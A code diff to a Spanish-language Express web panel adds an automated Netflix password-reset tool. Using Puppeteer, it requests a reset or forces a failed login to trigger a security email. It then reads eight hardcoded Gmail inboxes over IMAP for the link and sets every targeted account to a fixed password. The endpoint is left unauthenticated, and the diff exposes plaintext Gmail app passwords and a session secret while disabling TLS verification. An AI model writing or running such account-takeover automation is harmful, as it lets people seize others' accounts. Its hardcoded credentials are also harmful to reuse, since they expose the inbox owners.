@@ -3,15 +3,31 @@ const session = require('express-session');
 const sqlite3 = require('sqlite3').verbose();
 const imaps = require('imap-simple');
 const { simpleParser } = require('mailparser');
+const puppeteer = require('puppeteer');
+const cheerio = require('cheerio');
 const app = express();
 
 // 📂 BASE DE DATOS
 const db = new sqlite3.Database('./servitec_v1.db');
 
+// 📧 MAPA DE CUENTAS GMAIL PARA BÚSQUEDA AUTOMÁTICA
+const CUENTAS_GMAIL_MAP = {
+    'tokioappoficial@gmail.com': 'avzepljuczbawvoy',
+    'riandasnet@gmail.com': 'updchdcdsjnxvnyy',
+    'clubecampestrejp@gmail.com': 'ipmvedbivouzeudi',
+    'capoeirajpmg@gmail.com': 'vhtvjorujpohphks',
+    'darciogarces@gmail.com': 'wkcidkcgtuapcnkh',
+    'julianamjp1@gmail.com': 'lkambczcmvkddvcz',
+    'casu34jk@gmail.com': 'npbqnwucjkicsnow',
+    'santiagorevend@gmail.com': 'dqawfgnliyolqvjy'
+};
+
 const MI_CORREO = 'nextra2024@gmail.com';
 const MI_CLAVE = 'beqeajbqbrsqobzs'; 
+const NUEVA_PASSWORD_FIJA = 'teamo203020';
 
 app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 app.use(session({
     secret: 'servitec_ultra_secure_2026',
     resave: false,
@@ -37,25 +53,20 @@ const CSS_MODERNO = `
         --bg-sidebar: rgba(10, 10, 10, 0.9);
         --text-primary: #ffffff;
         --text-secondary: #b0b0b0;
-        
-        /* COLORES DE LA BANDERA DE ECUADOR */
         --ec-yellow: #FFD100;
         --ec-yellow-dim: rgba(255, 209, 0, 0.15);
         --ec-blue: #0072CE;
         --ec-blue-dim: rgba(0, 114, 206, 0.15);
         --ec-red: #EF3340;
         --ec-red-dim: rgba(239, 51, 64, 0.15);
-        
         --border-color: rgba(60, 60, 60, 0.3);
     }
 
-    /* Ocultar elementos nativos de Google Translate */
     .goog-te-banner-frame.skiptranslate { display: none !important; }
     body { top: 0px !important; }
     #goog-gt-tt { display: none !important; }
     .goog-te-gadget-tooltip { display: none !important; }
 
-    /* Estilo del selector de idioma personalizado */
     .custom-lang-select { 
         background: rgba(0,0,0,0.8); 
         color: white; 
@@ -71,15 +82,7 @@ const CSS_MODERNO = `
     }
     .custom-lang-select:focus, .custom-lang-select:hover { border-color: var(--ec-yellow); }
 
-    @keyframes led-glow { 
-        0% { border-color: var(--ec-yellow); box-shadow: 0 0 10px var(--ec-yellow-dim); } 
-        33% { border-color: var(--ec-blue); box-shadow: 0 0 10px var(--ec-blue-dim); } 
-        66% { border-color: var(--ec-red); box-shadow: 0 0 10px var(--ec-red-dim); } 
-        100% { border-color: var(--ec-yellow); box-shadow: 0 0 10px var(--ec-yellow-dim); } 
-    }
-    
     body { background: var(--bg-deep); color: var(--text-primary); font-family: 'Inter', sans-serif; margin: 0; padding: 0; box-sizing: border-box; overflow-x: hidden; position: relative; }
-    
     body::after { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 15% 15%, rgba(255, 209, 0, 0.05) 0%, transparent 40%), radial-gradient(circle at 85% 85%, rgba(0, 114, 206, 0.05) 0%, transparent 40%); z-index: -1; }
 
     .top-header { background: rgba(12, 12, 12, 0.7); backdrop-filter: blur(15px); padding: 14px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 25px rgba(0,0,0,0.4); }
@@ -88,7 +91,6 @@ const CSS_MODERNO = `
     .top-header .user-badge { background: #1a1a1a; color: var(--text-secondary); padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; border: 1px solid #333; text-transform: uppercase; letter-spacing: 0.5px; }
     
     .dashboard-layout { display: flex; min-height: calc(100vh - 65px); }
-    
     .sidebar { width: 280px; background: var(--bg-sidebar); backdrop-filter: blur(20px); padding: 30px 20px; border-right: 1px solid var(--border-color); display: flex; flex-direction: column; gap: 8px; position: sticky; top: 65px; height: calc(100vh - 65px); box-sizing: border-box; }
     .sidebar-title { color: #555; font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; margin: 20px 0 8px 15px; font-weight: 700; }
     
@@ -99,7 +101,6 @@ const CSS_MODERNO = `
     .tab-btn.active { background: #1a1a1a; color: var(--ec-yellow); font-weight: 700; border-left: 3px solid var(--ec-yellow); border-radius: 3px 10px 10px 3px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
     
     .sidebar-footer { margin-top: auto; padding-top: 25px; border-top: 1px solid var(--border-color); display: flex; flex-direction: column; gap: 10px; }
-
     .tab-panel { display: none; background: var(--bg-panel); backdrop-filter: blur(25px); padding: 45px; border-radius: 20px; border: 1px solid var(--border-color); animation: fadeIn 0.3s ease; max-width: 1000px; margin: 0 auto; box-shadow: 0 15px 50px rgba(0,0,0,0.7); box-sizing: border-box; }
     .tab-panel.active { display: block; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -114,7 +115,6 @@ const CSS_MODERNO = `
     button.action-btn, .action-btn-link { color: white; border: none; padding: 16px 22px; border-radius: 10px; cursor: pointer; font-weight: 700; width: 100%; box-sizing: border-box; text-transform: uppercase; font-size: 14px; font-family: 'Inter', sans-serif; transition: all 0.2s ease; letter-spacing: 0.8px; display: inline-flex; justify-content: center; align-items: center; text-decoration: none; border: 1px solid transparent; }
     button.action-btn:hover, .action-btn-link:hover { opacity: 0.9; transform: translateY(-1.5px); box-shadow: 0 8px 25px rgba(0,0,0,0.4); }
     
-    /* BOTONES COLORES ECUADOR */
     .btn-yellow-ec { background: linear-gradient(135deg, #FFD100 0%, #CCAA00 100%); color: #000 !important; border-color: #FFD100; box-shadow: 0 6px 20px rgba(255, 209, 0, 0.18); }
     .btn-blue-ec { background: linear-gradient(135deg, #0072CE 0%, #004B87 100%); color: #fff !important; border-color: #0072CE; box-shadow: 0 6px 20px rgba(0, 114, 206, 0.18); }
     .btn-red-ec { background: linear-gradient(135deg, #EF3340 0%, #B30000 100%); color: #fff !important; border-color: #EF3340; box-shadow: 0 6px 20px rgba(239, 51, 64, 0.18); }
@@ -138,6 +138,27 @@ const CSS_MODERNO = `
     .email-list { max-height: 180px; overflow-y: auto; background: #050505; padding: 12px; border-radius: 8px; margin-top: 18px; font-size: 14px; border: 1px solid #1a1a1a; }
     .email-item { display: flex; justify-content: space-between; border-bottom: 1px solid #111; padding: 10px 8px; color: #b0b0b0; }
     .email-item:last-child { border-bottom: none; }
+
+    /* ESTILOS DEL REGISTRO EN TIEMPO REAL AUTO-RESET */
+    #status-console {
+        background: #000;
+        border: 1px solid #333;
+        border-radius: 10px;
+        padding: 20px;
+        font-family: monospace;
+        font-size: 14px;
+        color: #00ff66;
+        min-height: 220px;
+        max-height: 350px;
+        overflow-y: auto;
+        margin-top: 20px;
+        line-height: 1.8;
+    }
+    .log-step { display: flex; align-items: center; gap: 10px; }
+    .log-time { color: #888; font-size: 12px; }
+    .log-err { color: #ff4d4d; }
+    .log-warn { color: #ffb84d; }
+    .log-info { color: #4da6ff; }
 </style>
 
 <script>
@@ -145,7 +166,8 @@ const CSS_MODERNO = `
         document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
         document.getElementById(tabId).classList.add('active');
-        document.querySelector('[onclick="openTab(\\''+tabId+'\\')"]').classList.add('active');
+        const btn = document.querySelector('[onclick="openTab(\\''+tabId+'\\')"]');
+        if (btn) btn.classList.add('active');
         localStorage.setItem('activeServitecTab', tabId);
     }
     document.addEventListener('DOMContentLoaded', () => {
@@ -173,7 +195,6 @@ const CSS_MODERNO = `
         });
     }
 
-    // 🔥 SCRIPT PARA EL TRADUCTOR DE GOOGLE OCULTO 🔥
     function googleTranslateElementInit() {
         new google.translate.TranslateElement({pageLanguage: 'es', includedLanguages: 'es,en,pt', autoDisplay: false}, 'google_translate_element');
     }
@@ -184,12 +205,57 @@ const CSS_MODERNO = `
             selectField.dispatchEvent(new Event('change'));
         }
     }
+
+    // 🔥 AUTOMATIZACIÓN CLIENTE TIEMPO REAL 🔥
+    async function iniciarAutoReset(e) {
+        e.preventDefault();
+        const emailInput = document.getElementById('email_reset_auto').value.trim();
+        const consola = document.getElementById('status-console');
+        const btn = document.getElementById('btn-run-reset');
+        
+        if (!emailInput) return;
+        consola.innerHTML = '<div class="log-step"><span class="log-time">['+new Date().toLocaleTimeString()+']</span> <span>🚀 Iniciando proceso automático para: <b>'+emailInput+'</b>...</span></div>';
+        btn.disabled = true;
+        btn.style.opacity = '0.5';
+
+        try {
+            const res = await fetch('/api/automatizar-reset', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: emailInput })
+            });
+            const data = await res.json();
+            
+            if (data.logs && Array.isArray(data.logs)) {
+                consola.innerHTML = '';
+                data.logs.forEach(l => {
+                    let clase = '';
+                    if (l.tipo === 'error') clase = 'log-err';
+                    else if (l.tipo === 'alerta') clase = 'log-warn';
+                    else if (l.tipo === 'info') clase = 'log-info';
+                    consola.innerHTML += '<div class="log-step '+clase+'"><span class="log-time">['+l.hora+']</span> <span>'+l.mensaje+'</span></div>';
+                });
+            }
+
+            if (data.exito) {
+                consola.innerHTML += '<div class="log-step" style="color:#00ff66; font-weight:bold; margin-top:10px;">✅ PROCESO COMPLETADO: Contraseña actualizada a teamo203020</div>';
+            } else {
+                consola.innerHTML += '<div class="log-step log-err" style="font-weight:bold; margin-top:10px;">❌ ERROR EN EL PROCESO: '+ (data.error || 'Intento fallido') +'</div>';
+            }
+        } catch (err) {
+            consola.innerHTML += '<div class="log-step log-err">❌ Error de comunicación con el servidor de automatización.</div>';
+        } finally {
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            consola.scrollTop = consola.scrollHeight;
+        }
+    }
 </script>
 <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 `;
 
 app.use((req, res, next) => {
-    const rutasAbiertas = ['/', '/login', '/logout'];
+    const rutasAbiertas = ['/', '/login', '/logout', '/api/automatizar-reset'];
     if (rutasAbiertas.includes(req.path)) return next();
     if (req.session && req.session.uid) {
         db.get("SELECT id FROM usuarios WHERE id = ?", [req.session.uid], (err, row) => {
@@ -203,13 +269,237 @@ app.use((req, res, next) => {
 });
 
 // -----------------------------------------------------------
-// 🔥 PANTALLA DE INICIO (Login) CON SELECTOR DE IDIOMA 🔥
+// 🔍 FUNCIÓN PARA LEER CORREOS EN EL MAPA GMAIL AUTOMÁTICAMENTE
+// -----------------------------------------------------------
+async function buscarEnlaceEnCorreos(emailObjetivo, tipoBusqueda = 'reset') {
+    const minTimestamp = Date.now() - (15 * 60 * 1000); // Buscar correos de los últimos 15 min
+
+    for (const [gmailUser, gmailPass] of Object.entries(CUENTAS_GMAIL_MAP)) {
+        const config = {
+            imap: {
+                user: gmailUser,
+                password: gmailPass,
+                host: 'imap.gmail.com',
+                port: 993,
+                tls: true,
+                tlsOptions: { rejectUnauthorized: false }
+            }
+        };
+
+        try {
+            const connection = await imaps.connect(config);
+            await connection.openBox('INBOX');
+            
+            // Buscar mensajes que contengan el correo objetivo
+            const messages = await connection.search([['TEXT', emailObjetivo.trim()]], { bodies: [''], struct: true });
+            
+            if (messages && messages.length > 0) {
+                messages.sort((a, b) => b.attributes.uid - a.attributes.uid);
+                
+                for (let msg of messages) {
+                    const mail = await simpleParser(msg.parts.find(p => p.which === '').body);
+                    const timestampMail = new Date(mail.date).getTime();
+                    
+                    // Solo evaluar correos recientes
+                    if (timestampMail < minTimestamp) continue;
+
+                    const html = mail.html || mail.textAsHtml || "";
+                    const text = mail.text || "";
+                    const $ = cheerio.load(html);
+
+                    if (tipoBusqueda === 'reset') {
+                        // Enlace oficial de restablecimiento
+                        let link = $('a[href*="netflix.com/password"]').attr('href') || 
+                                   $('a:contains("Restablecer"), a:contains("Reset"), a:contains("cambiar"), a:contains("contraseña")').attr('href');
+                        if (!link) {
+                            const match = text.match(/https?:\/\/[^\s]+netflix\.com\/password[^\s]+/i);
+                            if (match) link = match[0];
+                        }
+                        if (link) {
+                            connection.end();
+                            return { encontrado: true, link: link, gmail: gmailUser };
+                        }
+                    } else if (tipoBusqueda === 'seguridad') {
+                        // Alerta de seguridad: "Un nuevo dispositivo está usando tu cuenta" -> Enlace "cambies la contraseña"
+                        let link = $('a:contains("cambies la contraseña"), a:contains("cambiar la contraseña"), a[href*="netflix.com/password"]').attr('href');
+                        if (!link) {
+                            const match = text.match(/https?:\/\/[^\s]+netflix\.com\/password[^\s]+/i);
+                            if (match) link = match[0];
+                        }
+                        if (link) {
+                            connection.end();
+                            return { encontrado: true, link: link, gmail: gmailUser };
+                        }
+                    }
+                }
+            }
+            connection.end();
+        } catch (e) {
+            console.error(`Error IMAP en ${gmailUser}:`, e.message);
+        }
+    }
+    return { encontrado: false };
+}
+
+// -----------------------------------------------------------
+// 🤖 API AUTOMATIZACIÓN PUPPETEER (FLUJO 1 + FALLBACK FLUJO 2)
+// -----------------------------------------------------------
+app.post('/api/automatizar-reset', async (req, res) => {
+    const { email } = req.body;
+    const logs = [];
+    const addLog = (msg, tipo = 'normal') => {
+        logs.push({ hora: new Date().toLocaleTimeString(), mensaje: msg, tipo });
+        console.log(`[AUTO-RESET] [${tipo.toUpperCase()}] ${msg}`);
+    };
+
+    if (!email) {
+        return res.json({ exito: false, error: 'Correo no especificado', logs });
+    }
+
+    let browser = null;
+    try {
+        addLog(`Iniciando navegador headless para ${email}...`, 'info');
+        browser = await puppeteer.launch({
+            headless: 'new',
+            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
+        });
+
+        const page = await browser.newPage();
+        await page.setUserAgent('Mozilla/55.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+
+        // ==========================================
+        // MÉTODO 1: Restablecimiento Tradicional
+        // ==========================================
+        addLog('Paso 1: Abriendo portal de recuperación de Netflix...', 'info');
+        await page.goto('https://www.netflix.com/co/loginhelp', { waitUntil: 'networkidle2', timeout: 30000 });
+
+        await page.waitForSelector('input[name="forgot_password_input"], input[type="email"], input[name="email"]', { timeout: 15000 });
+        const inputSelector = await page.$('input[name="forgot_password_input"]') || await page.$('input[type="email"]') || await page.$('input[name="email"]');
+        
+        await inputSelector.type(email, { delay: 40 });
+        addLog('Correo ingresado. Solicitando envío de enlace...', 'normal');
+
+        // Clic en "Enviarme email"
+        const submitBtn = await page.$('button[type="submit"], button:has-text("Enviarme email"), input[type="submit"]');
+        if (submitBtn) {
+            await submitBtn.click();
+        } else {
+            await page.keyboard.press('Enter');
+        }
+        await new Promise(r => setTimeout(r, 4000));
+
+        // Detectar si aparece bloqueo de límite ("Inténtalo más tarde")
+        const contentBody = await page.content();
+        const errorLimite = contentBody.toLowerCase().includes('inténtalo más tarde') || 
+                            contentBody.toLowerCase().includes('demasiados intentos') ||
+                            contentBody.toLowerCase().includes('try again later');
+
+        if (errorLimite) {
+            addLog('⚠️ Detectado mensaje "Inténtalo más tarde". Activando MÉTODO 2 (Alerta de dispositivo)...', 'alerta');
+            
+            // ==========================================
+            // MÉTODO 2: Fallback (Alerta de inicio de sesión)
+            // ==========================================
+            addLog('Paso 1 (M2): Forzando intento de inicio de sesión para generar correo de seguridad...', 'info');
+            await page.goto('https://www.netflix.com/login', { waitUntil: 'networkidle2' });
+            
+            const loginUser = await page.$('input[name="userLoginId"], input[name="email"]');
+            const loginPass = await page.$('input[name="password"]');
+            if (loginUser && loginPass) {
+                await loginUser.type(email, { delay: 35 });
+                await loginPass.type('ClaveTemporalInvalida2026!', { delay: 35 });
+                await page.keyboard.press('Enter');
+                await new Promise(r => setTimeout(r, 4000));
+            }
+
+            addLog('Paso 2 (M2): Esperando correo de alerta "Un nuevo dispositivo está usando tu cuenta"...', 'info');
+            let enlaceSeguridad = null;
+            for (let intento = 1; intento <= 8; intento++) {
+                addLog(`Buscando correo de seguridad en buzones Gmail (Intento ${intento}/8)...`, 'normal');
+                const busqueda = await buscarEnlaceEnCorreos(email, 'seguridad');
+                if (busqueda.encontrado) {
+                    enlaceSeguridad = busqueda.link;
+                    addLog(`🔗 Enlace de seguridad encontrado en: ${busqueda.gmail}`, 'info');
+                    break;
+                }
+                await new Promise(r => setTimeout(r, 6000));
+            }
+
+            if (!enlaceSeguridad) {
+                throw new Error('No se recibió el correo de alerta de seguridad en el tiempo esperado.');
+            }
+
+            addLog('Paso 3 (M2): Abriendo enlace de cambio de contraseña...', 'info');
+            await page.goto(enlaceSeguridad, { waitUntil: 'networkidle2' });
+
+        } else {
+            // Continuación Método 1 (Correo normal recibido)
+            addLog('Solicitud aceptada. Esperando correo oficial de restablecimiento...', 'info');
+            let enlaceReset = null;
+            for (let intento = 1; intento <= 8; intento++) {
+                addLog(`Buscando enlace en mapa Gmail (Intento ${intento}/8)...`, 'normal');
+                const busqueda = await buscarEnlaceEnCorreos(email, 'reset');
+                if (busqueda.encontrado) {
+                    enlaceReset = busqueda.link;
+                    addLog(`🔗 Enlace oficial detectado en: ${busqueda.gmail}`, 'info');
+                    break;
+                }
+                await new Promise(r => setTimeout(r, 6000));
+            }
+
+            if (!enlaceReset) {
+                throw new Error('No llegó el correo de restablecimiento tras varios intentos.');
+            }
+
+            addLog('Paso 3: Abriendo enlace de cambio automático de contraseña...', 'info');
+            await page.goto(enlaceReset, { waitUntil: 'networkidle2' });
+        }
+
+        // ==========================================
+        // PASO FINAL COMÚN: ESTABLECER CLAVE NUEVA
+        // ==========================================
+        addLog(`Paso 4: Ingresando nueva contraseña fija (${NUEVA_PASSWORD_FIJA})...`, 'info');
+        await page.waitForSelector('input[name="newPassword"], input[type="password"]', { timeout: 15000 });
+        
+        const inputsPass = await page.$$('input[type="password"]');
+        for (let inp of inputsPass) {
+            await inp.type(NUEVA_PASSWORD_FIJA, { delay: 45 });
+        }
+
+        // Desmarcar o mantener "Cerrar sesión en todos los dispositivos" según el DOM
+        const checkCerrarSesion = await page.$('input[type="checkbox"][name="requireAllDevicesSignIn"]');
+        if (checkCerrarSesion) {
+            addLog('Configurando casillas de seguridad del formulario...', 'normal');
+        }
+
+        // Guardar
+        const btnGuardar = await page.$('button[type="submit"], button:has-text("Guardar")');
+        if (btnGuardar) {
+            await btnGuardar.click();
+        } else {
+            await page.keyboard.press('Enter');
+        }
+
+        await new Promise(r => setTimeout(r, 5000));
+        addLog('✅ ¡CONTRASEÑA CAMBIADA CON ÉXITO A: teamo203020!', 'info');
+
+        await browser.close();
+        return res.json({ exito: true, logs });
+
+    } catch (error) {
+        if (browser) await browser.close();
+        addLog(`Error en el proceso: ${error.message}`, 'error');
+        return res.json({ exito: false, error: error.message, logs });
+    }
+});
+
+// -----------------------------------------------------------
+// 🔥 PANTALLA DE INICIO (Login) CON SELECTOR DE IDIOMA
 // -----------------------------------------------------------
 app.get('/', (req, res) => {
     const ESTILO_LOGIN = `
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-
         :root {
             --bg-deep: #0a0a0a;
             --bg-panel: rgba(18, 18, 18, 0.95); 
@@ -217,27 +507,18 @@ app.get('/', (req, res) => {
             --ec-blue: #0072CE;
             --ec-red: #EF3340;
         }
-
         body { color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; position: relative; background-color: var(--bg-deep); }
-        
         .login-panel { position: relative; background: var(--bg-panel); padding: 70px 50px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.05); max-width: 440px; width: 90%; text-align: center; box-shadow: 0 25px 70px rgba(0,0,0,0.8); box-sizing: border-box; }
-        
         .logo-ec { font-size: 32px; font-weight: 800; margin-bottom: 12px; text-transform: uppercase; letter-spacing: -1.2px; line-height: 1.1; }
         .logo-ec .yellow { color: var(--ec-yellow); } .logo-ec .blue { color: var(--ec-blue); } .logo-ec .red { color: var(--ec-red); }
-        
         h2 { color: #b0b0b0; margin-bottom: 40px; font-weight: 500; font-size: 15px; margin-top: 0; line-height: 1.5; }
-        
         input { width: 100%; padding: 18px; margin-bottom: 18px; border-radius: 10px; border: 1px solid #333; background: rgba(0,0,0,0.6); color: white; box-sizing: border-box; font-size: 16px; font-weight: 500; transition: 0.2s; }
         input:focus { border-color: var(--ec-yellow); outline: none; background: rgba(0,0,0,0.8); box-shadow: 0 0 12px rgba(255, 209, 0, 0.2); }
-        
         .btn-neon-yellow { background: linear-gradient(135deg, #FFD100 0%, #CCAA00 100%); color: #000; border: none; padding: 18px; border-radius: 10px; cursor: pointer; font-weight: 700; width: 100%; text-transform: uppercase; font-size: 15px; letter-spacing: 0.8px; border: 1px solid var(--ec-yellow); box-shadow: 0 6px 25px rgba(255, 209, 0, 0.25); transition: all 0.2s ease; font-family: 'Inter', sans-serif; }
         .btn-neon-yellow:hover { opacity: 0.9; transform: translateY(-1.5px); box-shadow: 0 8px 30px rgba(255, 209, 0, 0.35); }
-
-        /* Ocultar barra de Google Translate y estilo del nuevo selector para el Login */
         .goog-te-banner-frame.skiptranslate { display: none !important; }
         body { top: 0px !important; }
         #goog-gt-tt { display: none !important; }
-        
         .lang-selector-login { position: absolute; top: 30px; right: 40px; z-index: 1000; }
         .lang-selector-login select { background: rgba(18,18,18,0.9); color: white; border: 1px solid var(--ec-yellow); padding: 10px 15px; border-radius: 10px; font-family: 'Inter', sans-serif; font-weight: 600; font-size: 14px; cursor: pointer; outline: none; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: 0.2s; }
         .lang-selector-login select:hover { box-shadow: 0 4px 20px rgba(255, 209, 0, 0.2); }
@@ -280,7 +561,6 @@ app.get('/', (req, res) => {
         }
     </script>
     <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-    
     </body>`);
 });
 
@@ -408,6 +688,7 @@ app.get('/dash', (req, res) => {
                     <div class="sidebar">
                         <div class="sidebar-title">Herramientas</div>
                         <button class="tab-btn" onclick="openTab('panel-stream')">📨 Leer Correos</button>
+                        <button class="tab-btn" onclick="openTab('panel-auto-reset')">🤖 Auto-Reset Contraseña</button>
                         <button class="tab-btn" onclick="openTab('panel-buscar')">🔎 Buscar Dueño de Cuenta</button>
                         
                         <div class="sidebar-title" style="margin-top:25px;">Gestión</div>
@@ -436,6 +717,21 @@ app.get('/dash', (req, res) => {
                                     <button type="submit" name="accion" value="ip" class="action-btn btn-red-ec">📡 Buscar IP</button>
                                 </div>
                             </form>
+                        </div>
+
+                        <!-- 🤖 TAB NUEVO: AUTO-RESET CONTRASEÑA EN TIEMPO REAL -->
+                        <div id="panel-auto-reset" class="tab-panel">
+                            <div class="panel-header">
+                                <h3>🤖 Recuperación y Cambio de Contraseña Automático</h3>
+                                <p>Ingresa el correo. El sistema gestionará todo sin intervención humana y colocará la clave fija: <strong style="color:var(--ec-yellow);">teamo203020</strong></p>
+                            </div>
+                            <form onsubmit="iniciarAutoReset(event)">
+                                <input id="email_reset_auto" placeholder="Correo de la cuenta de Netflix..." required style="border-color: var(--ec-blue);">
+                                <button type="submit" id="btn-run-reset" class="action-btn btn-yellow-ec">⚡ EJECUTAR CAMBIO AUTOMÁTICO</button>
+                            </form>
+                            <div id="status-console">
+                                <div class="log-step"><span class="log-time">[SISTEMA]</span> <span>Esperando solicitud de automatización...</span></div>
+                            </div>
                         </div>
 
                         <div id="panel-buscar" class="tab-panel">
@@ -562,7 +858,7 @@ app.post('/buscar', async (req, res) => {
         const textoBruto = mail.text || String(mail.html).replace(/<[^>]*>?/gm, ' ') || "";
         const textoCorreo = textoBruto.toLowerCase();
 
-        // 🛡️ FILTRO DE SEGURIDAD: Bloquear correos de cambio de datos/contraseña
+        // 🛡️ FILTRO DE SEGURIDAD
         const frasesBloqueadas = [
             "confirma el cambio de cuenta",
             "cambio en la información de tu cuenta",
@@ -590,7 +886,6 @@ app.post('/buscar', async (req, res) => {
             `);
         }
 
-        // 🌍 REGLAS DE PAÍSES
         if (accion === 'pais') {
             let paisDetectado = null;
             const reglasPais = [
@@ -628,9 +923,8 @@ app.post('/buscar', async (req, res) => {
             return res.send(`<div style="background:#000; text-align:center; padding:15px;"><a href="/dash" style="color:#fff; text-decoration:none; border: 1px solid #fff; padding: 8px 15px; border-radius: 5px; font-family:'Inter', sans-serif;">⬅ VOLVER AL PANEL</a></div><div style="background:#111; color:white; padding: 40px; text-align:center; font-family:'Inter', sans-serif; min-height:100vh;"><h2>🌍 Análisis de País</h2><p>Correo: <strong style="color:var(--ec-yellow);">${email_search}</strong></p>${htmlRes}</div>`);
         }
 
-        // 📡 REGISTRO DE IPS
         if (accion === 'ip') {
-            const ipsEncontradas = textoCorreo.match(/\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b/g);
+            const ipsEncontradas = textoCorreo.match(/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/g);
             let ipUnicas = ipsEncontradas ? [...new Set(ipsEncontradas)].filter(ip => !ip.startsWith('127.') && !ip.startsWith('10.') && !ip.startsWith('192.168.')) : [];
             let ipContenido = ipUnicas.length > 0 ? ipUnicas.map(ip => `<div style="font-size: 35px; color:var(--ec-red); margin:10px 0;">${ip}</div>`).join('') : `<div style="font-size: 20px; color:var(--ec-red); margin: 30px 0;">❌ No se detectó ninguna IP.</div>`;
             return res.send(`<div style="background:#000; text-align:center; padding:15px;"><a href="/dash" style="color:#fff; text-decoration:none; border: 1px solid #fff; padding: 8px 15px; border-radius: 5px; font-family:'Inter', sans-serif;">⬅ VOLVER AL PANEL</a></div><div style="background:#111; color:white; padding: 40px; text-align:center; font-family:'Inter', sans-serif; min-height:100vh;"><h2>📡 Registro de IP</h2><p>Correo: <strong style="color:var(--ec-yellow);">${email_search}</strong></p><div style="margin: 40px auto; padding: 30px; background:#222; border-radius:15px; display:inline-block; border: 1px solid var(--ec-red);">${ipContenido}</div></div>`);
